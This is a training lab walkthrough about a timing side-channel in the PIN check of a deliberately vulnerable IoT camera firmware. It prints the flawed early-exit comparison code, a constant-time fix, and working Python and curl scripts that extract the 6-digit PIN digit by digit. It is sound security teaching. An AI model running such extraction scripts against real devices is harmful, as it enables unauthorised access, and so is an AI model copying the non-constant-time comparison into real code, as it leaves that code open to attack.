# L30: Timing Attack on PIN Verification

## Goal
Extract the device PIN digit-by-digit by measuring timing variations in the `checkPIN()` function, which uses character-by-character comparison with early exit and per-character delay.

## Background

**Why this matters**: PIN verification that compares byte-by-byte and returns early on mismatch leaks information through timing. Attackers measure response time to determine correct digits one at a time.

**What you're looking for in IoT devices:**
- PIN or password verification with early return on first wrong character
- Non-constant-time comparison functions (`strcmp()`, `memcmp()`, manual loop)
- Measurable timing differences in authentication responses
- No rate limiting on authentication attempts

**On CoreS3**: `POST /api/check_pin` compares the submitted PIN against `userPIN` (randomly generated on first boot, 6 digits, stored in NVS) character by character. On each correct digit, it calls `delay(50)` (50 milliseconds) before checking the next. On the first wrong digit, it executes `break` (early exit). This means each additional correct digit adds ~50ms to the response time. The firmware also logs exact elapsed time to the serial console via `[PINCHK]`.

**The vulnerable endpoint (from CameraDevice_Web.cpp):**
```cpp
webServer->on("/api/check_pin", HTTP_POST, [this]() {
    String pin = webServer->arg("pin");
    unsigned long start = micros();
    bool match = true;

    for (int i = 0; i < (int)userPIN.length(); ++i) {
        if (i >= (int)pin.length() || pin[i] != userPIN[i]) {
            match = false;
            break;  // Early exit creates timing side-channel
        }
        delay(50);  // Per-character delay amplifies timing side-channel
    }

    unsigned long elapsed = micros() - start;
    DualSerial.printf("[PINCHK] /api/check_pin elapsed=%lu us result=%s\n",
                     elapsed, match ? "OK" : "FAIL");
    webServer->send(200, "text/plain", match ? "OK" : "FAIL");
});
```

**Timing profile:**

The `delay(50)` per correct digit creates a cumulative 50ms delay per correct digit:

- 0 correct digits: ~14ms (HTTP round-trip baseline, no delay)
- 1 correct digit: ~64ms (+50ms)
- 2 correct digits: ~114ms (+100ms)
- 3 correct digits: ~164ms (+150ms)
- 6 correct digits: ~314ms (+300ms), returns `"OK"`

The ~50ms delta per digit is clearly visible over WiFi with as few as 10 samples. The correct digit at each position stands out dramatically from all wrong digits.

**Constant-time comparison (secure alternative):**
```cpp
bool checkPIN_secure(const char* input, const char* correct) {
    uint8_t result = 0;
    for (int i = 0; i < 6; i++) {
        result |= input[i] ^ correct[i];  // No early exit
    }
    return result == 0;  // Same time regardless of correctness
}
```

## Lab Walkthrough

### Step 1: Measure Baseline Timing

Send a completely wrong PIN to establish the baseline for zero correct digits. The `break` fires immediately, so no `delay(50)` calls execute.

```bash
# Measure baseline with completely wrong PIN
for i in {1..5}; do
  curl -s -w "\nHTTP time: %{time_total}s\n" \
    -X POST http://192.168.4.1/api/check_pin \
    -d "pin=000000"
done

# Expected output:
# FAIL
# HTTP time: 0.012345s
# FAIL
# HTTP time: 0.011892s
# ...
#
# Baseline: ~12ms HTTP round-trip for all-wrong PIN

# Serial console shows server-side timing for all-wrong PIN:
# [PINCHK] /api/check_pin elapsed=850 us result=FAIL
# [PINCHK] /api/check_pin elapsed=820 us result=FAIL
```

### Step 2: Brute Force the First Digit

Try all digits 0-9 in the first position (rest zeros). The correct first digit triggers one `delay(50)` call, adding ~50ms to the response time.

```bash
python3 << 'EOF'
import requests
import time
import statistics

url = 'http://192.168.4.1/api/check_pin'
SAMPLES = 10
session = requests.Session()

print("=== Brute-forcing first digit ===")
print(f"{'Digit':<8} {'Median (ms)':<15} {'Response'}")
print("-" * 40)

timings = {}
for d in range(10):
    pin = str(d) + '00000'
    times = []
    for _ in range(SAMPLES):
        start = time.time()
        r = session.post(url, data={'pin': pin})
        elapsed = (time.time() - start) * 1000
        times.append(elapsed)
    med = statistics.median(times)
    timings[d] = med
    print(f"  {d:<8} {med:<15.1f} {r.text}")

correct_digit = max(timings, key=timings.get)
print(f"\nFirst digit (longest median): {correct_digit}")
print(f"  Timing delta: {timings[correct_digit] - min(timings.values()):.1f}ms")
session.close()
EOF

# Expected: one digit jumps to ~65ms while all others stay at ~14ms
# The correct digit is unmistakable - it takes 4-5x longer than wrong digits
```

### Step 3: Extract All Six Digits

Repeat for each position, building the PIN one digit at a time. For position N, the known correct digits 0..N-1 are fixed, and all 10 candidates are tried at position N with zeros padding the rest. Instead of brute-forcing 1,000,000 PINs, this needs at most 60 guesses (10 x 6 positions).

```bash
python3 << 'EOF'
import requests
import time
import statistics

url = 'http://192.168.4.1/api/check_pin'
PIN_LENGTH = 6
known_pin = ""
session = requests.Session()

print("=" * 60)
print("TIMING ATTACK - Extracting PIN digit by digit")
print("=" * 60)

for pos in range(PIN_LENGTH):
    # Later positions need more samples because WiFi jitter grows
    # relative to the fixed 50ms signal as the baseline increases
    samples = 10 + pos * 10  # 10, 20, 30, 40, 50, 60

    print(f"\n--- Position {pos + 1} of {PIN_LENGTH} ({samples} samples) ---")

    timings = {}
    for d in range(10):
        test_pin = known_pin + str(d) + '0' * (PIN_LENGTH - pos - 1)
        times = []
        for _ in range(samples):
            start = time.time()
            r = session.post(url, data={'pin': test_pin})
            elapsed = (time.time() - start) * 1000
            times.append(elapsed)

        med = statistics.median(times)
        timings[d] = med
        print(f"  PIN {test_pin}: {med:.1f}ms")

    correct = max(timings, key=timings.get)
    delta = timings[correct] - min(timings.values())
    known_pin += str(correct)
    print(f"  >> Digit {pos + 1} = {correct} (delta: {delta:.1f}ms)")

# Verify
print(f"\n{'=' * 60}")
print(f"EXTRACTED PIN: {known_pin}")
r = session.post(url, data={'pin': known_pin})
print(f"VERIFICATION:  {r.text}")
if r.text == "OK":
    print("PIN EXTRACTED SUCCESSFULLY")
else:
    print("VERIFICATION FAILED - re-run or increase sample counts")
print(f"{'=' * 60}")
session.close()
EOF
```

The script uses a persistent HTTP session for consistent connection reuse and verifies the extracted PIN at the end. If network jitter causes a wrong digit, increase `SAMPLES` or re-run. You can also use `tools/timing_attack.py` which adds confidence scoring and serial console monitoring.

### Step 4: Verify the Extracted PIN

Submit the fully extracted PIN to confirm the attack succeeded.

```bash
# Verify the extracted PIN (replace XXXXXX with your extracted PIN)
curl -s -X POST http://192.168.4.1/api/check_pin \
  -d "pin=XXXXXX"

# Expected output:
# OK

# Serial console:
# [PINCHK] /api/check_pin elapsed=301060 us result=OK

# Attack efficiency:
# Brute force: up to 1,000,000 attempts (10^6)
# Timing attack: 10 digits x 6 positions x 10 samples = 600 requests
# Each correct digit adds ~50ms - visible even in a single request
```

## Impact

- **Timing side-channel confirmed**: Each correct digit adds ~50ms, clearly visible in a single HTTP request
- **PIN extracted digit-by-digit**: 6-digit PIN recovered in ~600 HTTP requests (10 samples x 60 candidates) vs. 1,000,000 brute-force
- **Early exit vulnerability**: `break` on first mismatch leaks which position failed
- **No rate limiting**: `/api/check_pin` accepts unlimited requests with no lockout
- **Dual measurement channels**: Attack works purely over HTTP (with averaging) or via serial console for exact server-side timing
- **Complete authentication bypass**: Recovered PIN unlocks the device

## References

- [CWE-208: Observable Timing Discrepancy](https://cwe.mitre.org/data/definitions/208.html)
- [CWE-1254: Incorrect Comparison Logic Granularity](https://cwe.mitre.org/data/definitions/1254.html)
- [CWE-307: Improper Restriction of Excessive Authentication Attempts](https://cwe.mitre.org/data/definitions/307.html)
- [Timing Attacks on Implementations - Kocher 1996](https://www.rambus.com/timing-attacks/)
- [Constant-Time Programming - BearSSL](https://www.bearssl.org/constanttime.html)
- [OWASP Testing for Timing Attacks](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/10-Business_Logic_Testing/04-Test_for_Process_Timing)
- [ESP32-S3 Technical Reference Manual](https://www.espressif.com/sites/default/files/documentation/esp32-s3_technical_reference_manual_en.pdf)
